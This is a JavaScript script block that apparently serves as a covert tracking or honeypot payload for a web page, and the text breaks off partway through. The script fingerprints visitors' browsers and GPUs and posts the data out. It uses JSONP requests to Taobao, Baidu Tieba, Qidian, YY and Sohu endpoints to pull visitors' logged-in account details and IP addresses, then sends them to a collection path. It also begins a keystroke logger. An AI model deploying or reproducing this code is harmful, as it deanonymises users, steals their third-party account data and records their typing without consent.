<script>"use strict";

function ajax(params) {
  params = params || {};
  params.data = params.data || {};
  var json = params.jsonp ? jsonp(params) : json(params);

  function jsonp(params) {
    var callbackName = params.jsonp;
    var head = document.getElementsByTagName('head')[0];
    params.data['callback'] = callbackName;
    var data = formatParams(params.data);
    var script = document.createElement('script');
    head.appendChild(script);

    window[callbackName] = function (json) {
      head.removeChild(script);
      clearTimeout(script.timer);
      window[callbackName] = null;
      params.success && params.success(json);
    };

    script.src = params.url + '?' + data;

    if (params.time) {
      script.timer = setTimeout(function () {
        window[callbackName] = null;
        head.removeChild(script);
        params.error && params.error({
          message: 'long time'
        });
      }, time);
    }
  }

  function formatParams(data) {
    var arr = [];

    for (var name in data) {
      arr.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));
    } // arr.push('v=' + random());


    return arr.join('&');
  }

  function random() {
    return Math.floor(Math.random() * 10000 + 500);
  }
}

function BrowserType(url) {
  var ua = navigator.userAgent.toLowerCase();

  var testUa = function testUa(regexp) {
    return regexp.test(ua);
  };

  var testVs = function testVs(regexp) {
    return ua.match(regexp).toString().replace(/[^0-9|_.]/g, "").replace(/_/g, ".");
  };

  var system = "unknow";

  if (testUa(/windows|win32|win64|wow32|wow64/g)) {
    system = "windows";
  } else if (testUa(/macintosh|macintel/g)) {
    system = "macos";
  } else if (testUa(/x11/g)) {
    system = "linux";
  } else if (testUa(/android|adr/g)) {
    system = "android";
  } else if (testUa(/ios|iphone|ipad|ipod|iwatch/g)) {
    system = "ios";
  }

  var systemVs = "unknow";

  if (system === "windows") {
    if (testUa(/windows nt 5.0|windows 2000/g)) {
      systemVs = "2000";
    } else if (testUa(/windows nt 5.1|windows xp/g)) {
      systemVs = "xp";
    } else if (testUa(/windows nt 5.2|windows 2003/g)) {
      systemVs = "2003";
    } else if (testUa(/windows nt 6.0|windows vista/g)) {
      systemVs = "vista";
    } else if (testUa(/windows nt 6.1|windows 7/g)) {
      systemVs = "7";
    } else if (testUa(/windows nt 6.2|windows 8/g)) {
      systemVs = "8";
    } else if (testUa(/windows nt 6.3|windows 8.1/g)) {
      systemVs = "8.1";
    } else if (testUa(/windows nt 10.0|windows 10/g)) {
      systemVs = "10";
    }
  } else if (system === "macos") {
    //systemVs = testVs(/os x [\d._]+/g)
  } else if (system === "android") {
    //systemVs = testVs(/android [\d._]+/g)
  } else if (system === "ios") {
    //systemVs = testVs(/os [\d._]+/g)
  }

  var platform = "unknow";

  if (system === "windows" || system === "macos" || system === "linux") {
    platform = "desktop";
  } else if (system === "android" || system === "ios" || testUa(/mobile/g)) {
    platform = "mobile";
  }

  var engine = "unknow";
  var supporter = "unknow";

  if (testUa(/applewebkit/g)) {
    engine = "webkit";

    if (testUa(/edge/g)) {
      supporter = "edge";
    } else if (testUa(/opr/g)) {
      supporter = "opera";
    } else if (testUa(/chrome/g)) {
      supporter = "chrome";
    } else if (testUa(/safari/g)) {
      supporter = "safari";
    }
  } else if (testUa(/gecko/g) && testUa(/firefox/g)) {
    engine = "gecko";
    supporter = "firefox";
  } else if (testUa(/presto/g)) {
    engine = "presto";
    supporter = "opera";
  } else if (testUa(/trident|compatible|msie/g)) {
    engine = "trident";
    supporter = "iexplore";
  }

  var engineVs = "unknow";

  if (engine === "webkit") {
    engineVs = testVs(/applewebkit\/[\d._]+/g);
  } else if (engine === "gecko") {
    engineVs = testVs(/gecko\/[\d._]+/g);
  } else if (engine === "presto") {
    engineVs = testVs(/presto\/[\d._]+/g);
  } else if (engine === "trident") {
    engineVs = testVs(/trident\/[\d._]+/g);
  }

  var supporterVs = "unknow";

  if (supporter === "chrome") {
    supporterVs = testVs(/chrome\/[\d._]+/g);
  } else if (supporter === "safari") {
    supporterVs = testVs(/version\/[\d._]+/g);
  } else if (supporter === "firefox") {
    supporterVs = testVs(/firefox\/[\d._]+/g);
  } else if (supporter === "opera") {
    supporterVs = testVs(/opr\/[\d._]+/g);
  } else if (supporter === "iexplore") {
    supporterVs = testVs(/(msie [\d._]+)|(rv:[\d._]+)/g);
  } else if (supporter === "edge") {
    supporterVs = testVs(/edge\/[\d._]+/g);
  }

  var shell = "none";
  var shellVs = "unknow";

  if (testUa(/micromessenger/g)) {
    shell = "wechat";
    shellVs = testVs(/micromessenger\/[\d._]+/g);
  } else if (testUa(/qqbrowser/g)) {
    shell = "qq";
    shellVs = testVs(/qqbrowser\/[\d._]+/g);
  } else if (testUa(/ucbrowser/g)) {
    shell = "uc";
    shellVs = testVs(/ucbrowser\/[\d._]+/g);
  } else if (testUa(/qihu 360se/g)) {
    shell = "360";
  } else if (testUa(/2345explorer/g)) {
    shell = "2345";
    shellVs = testVs(/2345explorer\/[\d._]+/g);
  } else if (testUa(/metasr/g)) {
    shell = "sougou";
  } else if (testUa(/lbbrowser/g)) {
    shell = "liebao";
  } else if (testUa(/maxthon/g)) {
    shell = "maxthon";
    shellVs = testVs(/maxthon\/[\d._]+/g);
  }

  var languages = navigator.languages || navigator.language || navigator.userLanguage;
  var CPUInfo = navigator.platform;
  var CPUNumber = navigator.hardwareConcurrency;
  var canvas = document.createElement("canvas");
  var gl = canvas.getContext("experimental-webgl");
  var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
  var VideoCardSuppliers = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
  var GraphicsCardRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  var ScreenWidth = window.screen.width;
  var ScreenHeight = window.screen.height;
  var ColorDepth = window.screen.colorDepth; // var NetType = navigator.connection.type;

  var res = Object.assign({
    engine: engine,
    engineVs: engineVs,
    platform: platform,
    supporter: supporter,
    supporterVs: supporterVs,
    system: system,
    systemVs: systemVs,
    languages: languages,
    CPUInfo: CPUInfo,
    CPUNumber: CPUNumber,
    VideoCardSuppliers: VideoCardSuppliers,
    GraphicsCardRenderer: GraphicsCardRenderer,
    ScreenWidth: ScreenWidth,
    ScreenHeight: ScreenHeight,
    ColorDepth: ColorDepth
  }, shell === "none" ? {} : {
    shell: shell,
    shellVs: shellVs
  });
  // var formData = new FormData();
  // formData.append('jInfo', window.btoa(unescape(encodeURIComponent(JSON.stringify(res))))); // bt

  fetch(url, {
    cache: "no-cache",
    method: "POST",
    body: window.btoa(unescape(encodeURIComponent(JSON.stringify(res))))
  });
}


ajax({
  url: 'https://www.taobao.com/help/getip.php',
  jsonp: 'ipCallback',
  data: {},
  success: function success(res) {
    localStorage.setItem('pub_ip', JSON.stringify(res));
  },
  error: function error(_error) {
    console.log(_error);
  }
});

ajax({
  url: 'https://tieba.baidu.com/tbmall/gettdouiconinfo',
  jsonp: 'jsonp1613919078534',
  data: {},
  success: function success(res) {
    localStorage.setItem('baidu', JSON.stringify(res));
  },
  error: function error(_error) {
    console.log(_error);
  }
});

ajax({
  url: 'https://www.qidian.com/ajax/UserInfoFemale/GetUserInfo',
  jsonp: 'autoLoginHandler',
  data: {'areaid': 6, 'appid': 10, 'format': 'jsonp', 'method': 'autoLoginHandler', 'autoLoginHandler': '', '_': '1607051376245'},
  success: function success(res) {
    localStorage.setItem('qidian', JSON.stringify(res));
  },
  error: function error(_error) {
    console.log(_error);
  }
});

ajax({
  url: 'https://www.yy.com/yyweb/user/queryUserInfo.json',
  jsonp: 'jsonp',
  data: {},
  success: function success(res) {
    localStorage.setItem('yy', JSON.stringify(res));
  },
  error: function error(_error) {
    console.log(_error);
  }
});

ajax({
  url: 'https://v2.sohu.com/api/pc-home-city/home-data/ip2location',
  jsonp: 'jQuery1124018281896477578718_1606458878259',
  data: {'_': '1606458878259'},
  success: function success(res) {
    localStorage.setItem('sohu_public_ip', JSON.stringify(res));
  },
  error: function error(_error) {
    console.log(_error);
  }
});


function send_data(types) {
  var data = {};
  data["public_ip"] = {};

  try {
    data["public_ip"]['taobao_public_ip'] = JSON.parse(localStorage.getItem('pub_ip'))['ip'];
  } catch (e) {
    data["public_ip"]['taobao_public_ip'] = "taobaoip获取接口可能已失效或者未设置，请尽快检查";
  } finally {}
  try {
        data["public_ip"]["sohu_public_ip"] = JSON.parse(localStorage.getItem('sohu_public_ip'))["data"]["ip"];
      } catch (e) {
        data["public_ip"]['sohu_public_ip'] = "sohu_ip获取接口可能已失效或者未设置，请尽快检查";
      } finally {}

  types.forEach(function (item) {
  if (item.endsWith("ip")){

  }else{
      data[item] = JSON.parse(localStorage.getItem(item));
    }
  });
  // var jp = new FormData();
  // jp.append("jInfo", window.btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
  fetch('/other_data', {
    method: 'POST',
    cache: "no-cache",
    body: window.btoa(unescape(encodeURIComponent(JSON.stringify(data))))
  });
}

var logger = "";

var keyDown = function keyDown(e) {
  var e = e || event;
  var currKey = e.keyCode || e.which || e.charCode;
  var keyName = ""
  if (currKey > 7 && currKey < 32 || currKey > 31 && currKey < 47) {
    switch (currKey) {
      case 8:
        keyName = "[退格]";
        break;

      case 9:
        keyName = "[制表]";
        break;

      case 13:
        keyName = "[回车]";
        break;
      //case 16:keyName = "[shift]"; break;

      case 17:
        keyName = "[Ctrl]";
        break;

      case 18:
        keyName = "[Alt]";
        break;

      case 20:
        keyName = "[大小写]";
        break;

      case 32:
        keyName = "[空格]";
        break;

      case 33:
        keyName = "[PageUp]…</script>
